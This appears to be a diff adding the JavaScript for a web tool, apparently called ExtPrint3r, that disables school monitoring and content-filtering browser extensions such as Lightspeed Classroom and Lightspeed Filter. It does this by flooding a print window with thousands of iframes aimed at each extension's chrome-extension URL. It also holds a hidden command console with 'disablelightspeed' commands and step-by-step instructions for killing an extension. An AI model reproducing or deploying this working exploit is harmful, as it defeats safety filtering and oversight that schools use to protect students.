CgFMC37NnuoC2Pogzd8HH+srfbdvcPtxD9ISb6PG/QkYi+8tomB/sB4IXBlnF+I9u+X1Y7tKDAJKBWjIdHD4bvLao+ZGF9s7/jSS9AFHRnqvj1DYUhxyLfV7Vuj1H3H4B4WsJSHRfl/eEWIh7EJRj9wUUbtxqLLwO18SjvPKAT9OhAHrB6bHspFyodt2wED1bUbLewvjJCto/bDKbv0WZRcLEbBX1d4A3gHeB4YlKC9EYMEsxrslSRcMvBuMdrPbKuYqIo/1vRO+NddgpxQC2WLK+o2R3rA4+tujmtjbYcgG4n3WOJf4wt8lGwvqpQ2n8Jg0PgmKLvoKJi0WWU7SLy5+CmG7f4fD6TkIC9FdWVY5TgQ2D9XeqcSBZXdttYt9xbta7f4Mv+eHh9+e2W4YlEKsEHETjmKssfrKr5RUJSU91fte5kmpv2LeA+IOWXSgNGUH+cilpeUfMno/IfcSouJhRKLeGBR6rL5iYsleV3blrTHnyp5qci8vnQuHfhoHi9cbTqCeYFoC5e5cXIpWLJXQnNZerzYe6vXL9asO5S5P+GtjHPewTS1XUjmlcHjGUdBpIePKLKVUlJZntf1bo93nT/1xT9Rzj/188KOepYEY9iGyi2Sloo5UtSEaQladmMv3v95tblVbU/E5Flivz2PN9NTFcT+TjWgWLUzEniNvEZ/C66NunprO+vXP9muut8EeVzQDWQUtGyMWLHa2vXV1M2zlh8DYgcd54IlJUO1n8lfXuS0AQR+J3vhZtqbMf/cUvlSyrMSUVLWQREYIZqz7GGgylg5cql9q78k1dariwHboy/iGfpAlrOSXjUiuizgv3T+6rWnUqJxD2+NQtKHct7J/AZ4MPDsW8+CP4StPW2WEPAHlp74wzEvlMMohZqIaWglf34/g0dZY0R8wiu1Q0g4ja6Hmu/r7w2SKr80L7Fm48Bj/nWLHrOtgK3AZ8W5OoUD0mb6hhrMhCTAliWfAjlQawz5tckbSQK9caWV3xVNWGdd1LiSIsz+BavPba8qvZJN+i/AzF3gTwF7IeUPNquEEPFAJ9J+vaxClLQmRFxaE2JHuCD+Ja80gg8/+SW2S/UteRMFqPzwCpDdB7KxKRPmPrSCBxCNPZIINfuyU83MHaLsF6RfWrIE9EbgHlA3GwQKakAZ/jKnDcCwG5g95NbZj9dfyprrFr2tYLegMgcYCJQkOB8RgqcRqhD2Qr8BZEtQcvsKMlujUuEbhhclKcV958ubxyz50yySF9NWZHjymdDJva4hIaltAKcS0gZDgOHfT7+wHU3j/LanaXGkmkIU0LLsskI41ByQ4kt0kNfS39GlgDgR+hE6QJpQ/SYwA6jul3E2imewN6Aa5/2lddGTwAcD5QXg45+y1e+sdf8wlde2+Dz8VNnQZkXkYfiYTw6bxTgXHrCsFa3hJY3uwgtq3YU12cA6XbA5ItYY9SWAnXJE0yuYGfRk183HVGDsdoR7UC0A7RdVU6LoSHo0ADalOEJ+C89VtoRS6rWONMh8O+RVhc+H8a3JvArR9LuAp0x1MrOSwUIR6ih2kJ/DcDesDcqwnD48tkEUUwMto7jxrjRU/c3nW7QgjFvCfSrAKIE0kbXRQxbS6lVQFIYLkdO1+yHmPIstLqSFnXT7PtLdwRENdbdwx2h4TMsI08BholgU/G7Cr+Oh+lbAET6DUZVYUMQ67lo91wwQ0Cq41v2bLevpuyHjitNIHeD5khfu4ClcNJjmajzDgVWQDNwXMIc+6vggtRggj/2LaqJ6rX0/wGUyuO2DeKQowAAAABJRU5ErkJggg==",
+    "Lightspeed Classroom": "data:image/png;base64,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",
+        	};
+
+async function createExtensionButtons() {
+    let hasSupportedExtensions = false;
+
+    for (const [name, url] of Object.entries(extensions)) {
+        const success = await TryAddExtension(name, icons[name], url);
+        if (success) hasSupportedExtensions = true;
+    }
+
+    if (!hasSupportedExtensions) {
+        extContainer.innerHTML = "<p style='margin-left: 15px; font-size: 12px;'>No supported extensions installed :(</p>";
+    }
+}
+
+const iframeCountEl = document.querySelector("#iframe-count");
+iframeCountEl.addEventListener("input", () => {
+    document.querySelector("#iframe-count-display").textContent = iframeCountEl.value;
+});
+
+function createIframesAndPrint(extPage, extIcon) {
+    let printerWindow = window.open("", "_blank");
+    let fullscreenWindow = window.open("https://lms.fcps.edu/home", "_blank", `width=${screen.width},height=${screen.height},top=0,left=0`);
+    fullscreenWindow.moveTo(0, 0);
+    fullscreenWindow.resizeTo(screen.width, screen.height);
+    printerWindow.document.title = 'Disable';
+    printerWindow.document.body.style.backgroundColor = '#1e1f22';
+
+    let icon = printerWindow.document.createElement('link');
+    icon.rel = 'icon';
+    icon.href = extIcon;
+    icon.type = 'image/x-icon';
+    printerWindow.document.head.appendChild(icon);
+
+    let printerBody = printerWindow.document.body;
+
+    let loadingContainer = printerWindow.document.createElement("div");
+    loadingContainer.style.position = "fixed";
+    loadingContainer.style.top = "50%";
+    loadingContainer.style.left = "50%";
+    loadingContainer.style.transform = "translate(-50%, -50%)";
+    loadingContainer.style.color = "white";
+    loadingContainer.style.fontSize = "20px";
+    loadingContainer.style.fontFamily = "'Roboto', sans-serif";
+    loadingContainer.style.textAlign = "center";
+
+    let spinner = printerWindow.document.createElement("div");
+    spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
+    spinner.style.borderTop = "4px solid white";
+    spinner.style.borderRadius = "50%";
+    spinner.style.width = "40px";
+    spinner.style.height = "40px";
+    spinner.style.animation = "spin 1s linear infinite";
+    spinner.style.margin = "0 auto 10px";
+
+    let loadingText = printerWindow.document.createElement("div");
+    loadingText.innerText = "Loading...";
+
+    loadingContainer.appendChild(spinner);
+    loadingContainer.appendChild(loadingText);
+    printerBody.appendChild(loadingContainer);
+
+    let style = printerWindow.document.createElement("style");
+    style.innerHTML = `
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    `;
+    printerWindow.document.head.appendChild(style);
+
+    let script = printerWindow.document.createElement("script");
+    script.innerHTML = `
+        setTimeout(() => {
+            window.close();
+        }, 5000);
+    `;
+    printerWindow.document.body.appendChild(script);
+
+    setTimeout(() => {
+        for (let i = 0; i < iframeCountEl.value; i++) {
+            const iframe = document.createElement('iframe');
+            iframe.src = extPage;
+            iframe.width = "25px";
+            iframe.height = "25px";
+            iframe.style.border = "none";
+            printerBody.appendChild(iframe);
+        }
+
+        loadingContainer.remove();
+        printerWindow.print();
+        let iframes = printerWindow.document.querySelectorAll("iframe");
+        iframes.forEach(iframe => iframe.remove());
+    }, 1000);
+}
+
+createExtensionButtons();
+
+function createPopup(extName, extIcon, extPage, extId) {
+    const overlay = document.createElement("div");
+    overlay.style.position = "fixed";
+    overlay.style.top = "0";
+    overlay.style.left = "0";
+    overlay.style.width = "100vw";
+    overlay.style.height = "100vh";
+    overlay.style.background = "rgba(0, 0, 0, 0.6)";
+    overlay.style.zIndex = "999";
+    overlay.style.display = "flex";
+    overlay.style.justifyContent = "center";
+    overlay.style.alignItems = "center";
+
+    const popup = document.createElement("div");
+    popup.style.background = "#292a2d";
+    popup.style.color = "white";
+    popup.style.width = "500px";
+    popup.style.borderRadius = "10px";
+    popup.style.overflow = "hidden";
+    popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.3)";
+    popup.style.transition = "transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1)";
+
+    const header = document.createElement("div");
+    header.style.display = "flex";
+    header.style.alignItems = "center";
+    header.style.justifyContent = "space-between";
+    header.style.background = "#1e1f22";
+    header.style.padding = "10px";
+    header.style.borderBottom = "1px solid #444";
+
+    const icon = document.createElement("img");
+    icon.src = extIcon || "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
+    icon.onerror = function() {
+        this.src = "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
+    };
+    icon.style.width = "32px";
+    icon.style.height = "32px";
+    icon.style.marginLeft = "10px";
+    icon.style.marginRight = "8px";
+    icon.style.marginBottom = "5px";
+    icon.style.marginTop = "5px";
+    icon.style.userSelect = "none";
+
+    const title = document.createElement("span");
+    title.textContent = extName;
+    title.style.userSelect = "none";
+
+    const leftSection = document.createElement("div");
+    leftSection.style.display = "flex";
+    leftSection.style.alignItems = "center";
+    leftSection.appendChild(icon);
+    leftSection.appendChild(title);
+
+    const x = document.createElement("span");
+    x.textContent = "×";
+    x.style.background = "transparent";
+    x.style.color = "#9aa0a6";
+    x.style.fontSize = "24px";
+    x.style.marginRight = "-4px";
+    x.style.marginTop = "-22px";
+    x.style.cursor = "pointer";
+    x.style.userSelect = "none";
+    x.style.borderRadius = "50%";
+    x.style.padding = "0";
+    x.style.width = "32px";
+    x.style.height = "32px";
+    x.style.lineHeight = "32px";
+    x.style.textAlign = "center";
+    x.style.display = "inline-block";
+
+    x.onmouseover = () => {
+        x.style.backgroundColor = "rgba(255, 255, 255, 0.1)";
+    };
+
+    x.onmouseout = () => {
+        x.style.backgroundColor = "transparent";
+    };
+
+    x.onclick = () => document.body.removeChild(overlay);
+
+    header.appendChild(leftSection);
+    header.appendChild(x);
+
+    const instructions = document.createElement("p");
+    const settingsUrl = "chrome://extensions?id=" + extId;
+
+    instructions.innerHTML = `
+        Just Click Disable (Just Wait Like 20 Second) (It's Much Easier) <br><br>
+        <b>OR (The more Secure Protect)</b><br><br>
+        Open the following URL in a new tab:<br><br>
+        <span>${settingsUrl}</span><br><br>
+        Then go back to this one and press the button below, which will open a new tab. 
+        Immediately press <kbd>Ctrl + Tab</kbd> and start spamming the switch called 
+        "Allow Access to File URLs" for about 20 seconds. After closing the Schoology page,  
+        once you are done, close that tab and switch to the other one. Then, press cancel 
+        on the print dialog, and the tab should close. <br><br>
+        If done correctly, the extension <b>${extName}</b> should've been killed.
+    `;
+
+    instructions.style.padding = "15px";
+    instructions.style.textAlign = "center";
+
+    const buttonContainer = document.createElement("div");
+    buttonContainer.style.display = "flex";
+    buttonContainer.style.justifyContent = "center";
+    buttonContainer.style.padding = "10px";
+
+    const printButton = document.createElement("button");
+    printButton.textContent = "Disable";
+    printButton.style.width = "100px";
+    printButton.style.marginTop = "-15px";
+    printButton.style.marginBottom = "15px";
+    printButton.onclick = () => {
+        createIframesAndPrint(extPage, extIcon);
+        instructions.innerHTML = extName + ' has been killed!';
+        popup.removeChild(buttonContainer);
+    };
+
+    buttonContainer.appendChild(printButton);
+
+    overlay.onclick = (event) => {
+        if (event.target === overlay) {
+            popup.style.transform = "scale(1.03)";
+            setTimeout(() => {
+                popup.style.transform = "scale(1)";
+            }, 200);
+        }
+    };
+
+    popup.appendChild(header);
+    popup.appendChild(instructions);
+    popup.appendChild(buttonContainer);
+
+    overlay.appendChild(popup);
+    document.body.appendChild(overlay);
+}
+
+async function GetContributorData() {
+    let contributors = await (await fetch("https://api.github.com/repos/Blobby-Boi/ExtPrint3r/contributors")).json();
+    return contributors;
+}
+
+const contributorList = document.querySelector("#contributor-list");
+async function DisplayContributors() {
+    let contributors = await GetContributorData();
+
+    for (let contributor of contributors) {
+        console.log(contributor.avatar_url, contributor.html_url, contributor.login);
+        let a = document.createElement("a");
+        a.href = contributor.html_url;
+        a.classList.add("contributor");
+
+        let img = document.createElement("img");
+        img.src = contributor.avatar_url;
+        a.appendChild(img);
+
+        contributorList.appendChild(a);
+    }
+
+    document.querySelector("#contributor-content").style.display = "block";
+}
+
+DisplayContributors();
+
+function openPopup() {
+    let popup = document.getElementById('popup');
+    popup.style.display = "flex"; // Ensure it's visible before applying animation
+    setTimeout(() => {
+        popup.classList.add('show'); // Add the class to trigger transition
+    }, 10);
+}
+
+function closePopup() {
+    let popup = document.getElementById('popup');
+    popup.classList.remove('show'); // Remove the class to trigger transition
+    setTimeout(() => {
+        popup.style.display = "none"; // Hide the popup after the transition
+    }, 500); // Match the duration of the transition
+}
+
+const allCommands = [
+    "iframes set <number> - Set the number of iframes to create",
+    "iframes set max - Set the number of iframes to infinity (MAX POWER)",
+    "iframes - Show the default number of iframes",
+    "tabs set <number> - Set the number of tabs to open",
+    "tabs set max - Set the number of tabs to infinity (MAX POWER)",
+    "tabs - Show the number of tabs to be opened",
+    "controls - Show all available commands",
+    "time - Display the current time",
+    "clear - Clear the command history",
+    "disablelightspeedclassroom - Disable Lightspeed Classroom permanently (UNLIMITED POWER)",
+    "disablelightspeedfilter - Disable Lightspeed Filter permanently (UNLIMITED POWER)",
+    "disablelightspeed mix - Mix both extensions in each tab (UNLIMITED POWER)",
+];
+
+// Function to toggle the command box visibility
+function toggleCmdBox() {
+    const cmdBox = document.getElementById('cmd-box');
+    const cmdHistory = document.getElementById('cmd-history');
+
+    if (cmdBox.style.display === 'none' || cmdBox.style.display === '') {
+        cmdBox.style.display = 'flex'; // Show the command box
+        document.getElementById('cmd-input').focus(); // Focus the input field
+    } else {
+        cmdBox.style.display = 'none'; // Hide the command box
+        cmdHistory.classList.remove('show'); // Hide the command history
+    }
+}
+
+// Event listener for Ctrl + I
+document.addEventListener('keydown', (event) => {
+    if (event.ctrlKey && event.key === 'i') {
+        event.preventDefault(); // Prevent the default browser behavior (e.g., opening dev tools)
+        toggleCmdBox(); // Toggle the command box
+    }
+});
+
+// Event listener for Enter key
+document.getElementById('cmd-input').addEventListener('keydown', (event) => {
+    if (event.key === 'Enter') {
+        executeCommand(); // Execute the command when Enter is pressed
+    }
+});
+
+// Function to execute the command
+function executeCommand() {
+    const cmdInput = document.getElementById('cmd-input').value.trim();
+    if (cmdInput) {
+        if (cmdInput.toLowerCase() === 'controls') {
+            showControls();
+        } else if (cmdInput.toLowerCase() === 'clear') {
+            clearCommandHistory();
+        } else if (cmdInput.toLowerCase() === 'time') {
+            showTime();
+        } else if (cmdInput.toLowerCase().startsWith('iframes')) {
+            handleIframesCommand(cmdInput);
+        } else if (cmdInput.toLowerCase().startsWith('tabs')) {
+            handleTabsCommand(cmdInput);
+        } else if (cmdInput.toLowerCase() === 'disablelightspeedclassroom') {
+            disableLightspeedClassroom();
+        } else if (cmdInput.toLowerCase() === 'disablelightspeedfilter') {
+            disableLightspeedFilter();
+        } else if (cmdInput.toLowerCase() === 'disablelightspeed mix') {
+            disableLightspeedMix();
+        } else {
+            alert('Invalid command');
+        }
+
+        document.getElementById('cmd-input').value = ''; // Clear input
+    }
+}
+
+// Function to show all available commands
+function showControls() {
+    const cmdHistory = document.getElementById('cmd-history');
+    cmdHistory.innerHTML = allCommands.map(cmd => `<div>${cmd}</div>`).join('');
+    cmdHistory.classList.add('show');
+}
+
+// Function to clear command history (not used in this version)
+function clearCommandHistory() {
+    const cmdHistory = document.getElementById('cmd-history');
+    cmdHistory.innerHTML = ''; // Clear the history display
+    cmdHistory.classList.remove('show'); // Hide the history
+}
+
+// Function to display the current time
+function showTime() {
+    const now = new Date();
+    alert(`Current time: ${now.toLocaleTimeString()}`);
+}
+
+// Function to handle iframes commands
+function handleIframesCommand(cmdInput) {
+    const parts = cmdInput.split(' ');
+    if (parts[1] === 'set') {
+        if (parts[2] === 'max') {
+            iframeCountEl.value = 75000;
+            alert(`Iframes set to ${iframeCountEl.value}`);
+        } else if (!isNaN(parts[2])) {
+            iframeCountEl.value = parseInt(parts[2], 10);
+            alert(`Iframes set to ${iframeCountEl.value}`);
+        }
+    } else {
+        alert(`Default iframes: ${iframeCountEl.value}`);
+    }
+}
+
+// Function to handle tabs commands
+function handleTabsCommand(cmdInput) {
+    const parts = cmdInput.split(' ');
+    if (parts[1] === 'set') {
+        if (parts[2] === 'max') {
+            alert('Tabs set to infinity (MAX POWER)');
+        } else if (!isNaN(parts[2])) {
+            alert(`Tabs set to ${parts[2]}`);
+        }
+    } else {
+        alert('Default tabs: 1');
+    }
+}
+
+// Function to disable Lightspeed Classroom
+function disableLightspeedClassroom() {
+    const lightspeedClassroomId = "kkbmdgjggcdajckdlbngdjonpchpaiea"; // Extension ID for Lightspeed Classroom
+    const lightspeedClassroomUrl = `chrome-extension://${lightspeedClassroomId}/`; // Base URL for the extension
+
+    // Create a new window for the iframes
+    let printerWindow = window.open("", "_blank");
+    printerWindow.document.title = 'Disable Lightspeed Classroom';
+    printerWindow.document.body.style.backgroundColor = '#1e1f22';
+
+    // Add a loading spinner
+    let loadingContainer = printerWindow.document.createElement("div");
+    loadingContainer.style.position = "fixed";
+    loadingContainer.style.top = "50%";
+    loadingContainer.style.left = "50%";
+    loadingContainer.style.transform = "translate(-50%, -50%)";
+    loadingContainer.style.color = "white";
+    loadingContainer.style.fontSize = "20px";
+    loadingContainer.style.fontFamily = "'Roboto', sans-serif";
+    loadingContainer.style.textAlign = "center";
+
+    let spinner = printerWindow.document.createElement("div");
+    spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
+    spinner.style.borderTop = "4px solid white";
+    spinner.style.borderRadius = "50%";
+    spinner.style.width = "40px";
+    spinner.style.height = "40px";
+    spinner.style.animation = "spin 1s linear infinite";
+    spinner.style.margin = "0 auto 10px";
+
+    let loadingText = printerWindow.document.createElement("div");
+    loadingText.innerText = "Disabling Lightspeed Classroom...";
+
+    loadingContainer.appendChild(spinner);
+    loadingContainer.appendChild(loadingText);
+    printerWindow.document.body.appendChild(loadingContainer);
+
+    // Add CSS for the spinner
+    let style = printerWindow.document.createElement("style");
+    style.innerHTML = `
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    `;
+    printerWindow.document.head.appendChild(style);
+
+    // Create iframes to overload the extension
+    setTimeout(() => {
+        for (let i = 0; i < iframeCountEl.value; i++) { // Use the current iframe count
+            const iframe = document.createElement('iframe');
+            iframe.src = lightspeedClassroomUrl;
+            iframe.width = "25px";
+            iframe.height = "25px";
+            iframe.style.border = "none";
+            printerWindow.document.body.appendChild(iframe);
+        }
+
+        // Remove the loading spinner
+        loadingContainer.remove();
+
+        // Print the window to trigger the extension's disable mechanism
+        printerWindow.print();
+
+        // Close the window after a delay
+        setTimeout(() => {
+            printerWindow.close();
+            alert('Lightspeed Classroom has been disabled!');
+        }, 5000); // Adjust the delay as needed
+    }, 1000); // Adjust the delay as needed
+}
+
+// Function to disable Lightspeed Filter
+function disableLightspeedFilter() {
+    const lightspeedFilterId = "adkcpkpghahmbopkjchobieckeoaoeem"; // Extension ID for Lightspeed Filter
+    const lightspeedFilterUrl = `chrome-extension://${lightspeedFilterId}/`; // Base URL for the extension
+
+    // Create a new window for the iframes
+    let printerWindow = window.open("", "_blank");
+    printerWindow.document.title = 'Disable Lightspeed Filter';
+    printerWindow.document.body.style.backgroundColor = '#1e1f22';
+
+    // Add a loading spinner
+    let loadingContainer = printerWindow.document.createElement("div");
+    loadingContainer.style.position = "fixed";
+    loadingContainer.style.top = "50%";
+    loadingContainer.style.left = "50%";
+    loadingContainer.style.transform = "translate(-50%, -50%)";
+    loadingContainer.style.color = "white";
+    loadingContainer.style.fontSize = "20px";
+    loadingContainer.style.fontFamily = "'Roboto', sans-serif";
+    loadingContainer.style.textAlign = "center";
+
+    let spinner = printerWindow.document.createElement("div");
+    spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
+    spinner.style.borderTop = "4px solid white";
+    spinner.style.borderRadius = "50%";
+    spinner.style.width = "40px";
+    spinner.style.height = "40px";
+    spinner.style.animation = "spin 1s linear infinite";
+    spinner.style.margin = "0 auto 10px";
+
+    let loadingText = printerWindow.document.createElement("div");
+    loadingText.innerText = "Disabling Lightspeed Filter...";
+
+    loadingContainer.appendChild(spinner);
+    loadingContainer.appendChild(loadingText);
+    printerWindow.document.body.appendChild(loadingContainer);
+
+    // Add CSS for the spinner
+    let style = printerWindow.document.createElement("style");
+    style.innerHTML = `
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    `;
+    printerWindow.document.head.appendChild(style);
+
+    // Create iframes to overload the extension
+    setTimeout(() => {
+        for (let i = 0; i < iframeCountEl.value; i++) { // Use the current iframe count
+            const iframe = document.createElement('iframe');
+            iframe.src = lightspeedFilterUrl;
+            iframe.width = "25px";
+            iframe.height = "25px";
+            iframe.style.border = "none";
+            printerWindow.document.body.appendChild(iframe);
+        }
+
+        // Remove the loading spinner
+        loadingContainer.remove();
+
+        // Print the window to trigger the extension's disable mechanism
+        printerWindow.print();
+
+        // Close the window after a delay
+        setTimeout(() => {
+            printerWindow.close();
+            alert('Lightspeed Filter has been disabled!');
+        }, 5000); // Adjust the delay as needed
+    }, 1000); // Adjust the delay as needed
+}
+
+// Function to disable both extensions
+function disableLightspeedMix() {
+    disableLightspeedClassroom();
+    disableLightspeedFilter();
+}
+    </script>
+</body>
+</html>
